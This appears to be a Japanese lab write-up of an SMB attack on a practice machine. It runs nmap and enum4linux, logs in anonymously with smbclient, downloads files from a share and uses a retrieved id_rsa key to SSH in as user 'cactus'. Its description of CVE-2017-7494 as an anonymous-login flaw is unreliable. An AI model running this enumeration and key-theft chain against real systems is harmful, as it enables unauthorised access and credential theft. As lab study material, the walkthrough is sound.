# SMBusing

## enumerate SMB

* nmapでポートの空き状況を確認する（SMBの空き状況を確認）
  
```bash
# nmap 10.10.111.169

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-29 08:28 BST
Nmap scan report for ip-10-10-111-169.eu-west-1.compute.internal (10.10.111.169)
Host is up (0.00094s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:23:D6:CB:05:51 (Unknown)
```

* enum4linuxでユーザ情報やsharenameを確認する

```bash
enum4linux 10.10.111.169

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cactus (Local User)
[+] Enumerating users using SID S-1-5-21-434125608-3964652802-3194254534 and logon username '', password ''
S-1-5-21-434125608-3964652802-3194254534-500 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-501 POLOSMB\nobody (Local User)
```

```bash
enum4linux -S 10.10.111.169
========================================== 
|    Share Enumeration on 10.10.111.169    |
 ========================================== 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
```

* 脆弱性を確認する(AnonymousでSMBログイン（パスワードなし)できてしまう脆弱性

'https://www.cvedetails.com/cve/CVE-2017-7494/'


* sharenameを利用してSMB接続する

```bash
root@ip-10-10-140-19:/home/root# ls
root@ip-10-10-140-19:/home/root# smbclient //10.10.111.169/profiles -U anonymous -p 445
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> get "Working From Home Information.txt" 
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (116.5 KiloBytes/sec) (average 116.5 KiloBytes/sec)
smb: \> exit
```

* .sshよりid_rsaをget

```
```bash
root@ip-10-10-46-160:~# ls
Desktop    id_rsa        Pictures  Rooms    thinclient_drives
Downloads  Instructions  Postman   Scripts  Tools
root@ip-10-10-46-160:~# chmod 600 id_rsa 
root@ip-10-10-46-160:~# ssh -i id_rsa cactus@10.10.29.85
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 29 13:15:08 UTC 2022

  System load:  0.04               Processes:           93
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 19%                IP address for eth0: 10.10.29.85
  Swap usage:   0%


22 packages can be updated.
0 updates are security updates.


Last login: Sun May 29 13:14:33 2022 from 10.10.46.160
```

* SSH接続成功

